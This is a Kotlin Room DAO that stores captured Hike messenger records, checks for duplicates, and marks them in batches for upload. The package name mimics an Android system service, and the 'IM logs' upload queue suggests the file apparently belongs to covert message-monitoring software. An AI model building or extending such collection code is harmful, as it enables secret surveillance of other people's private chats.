package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.HikeUnrooted
import com.android.services.util.AppConstants

@Dao
interface HikeUnrootedDao {
    
    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(HikeUnrooted: HikeUnrooted)

    @Query("Select uniqueId from hike_unrooted_table where uniqueId = :messageId")
    fun checkHikeIfAlreadyExist(messageId: String): String?

    @Query("Select * from hike_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllHikeUnrootedLogs(status: Int): List<HikeUnrooted>

    @Query("Update hike_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}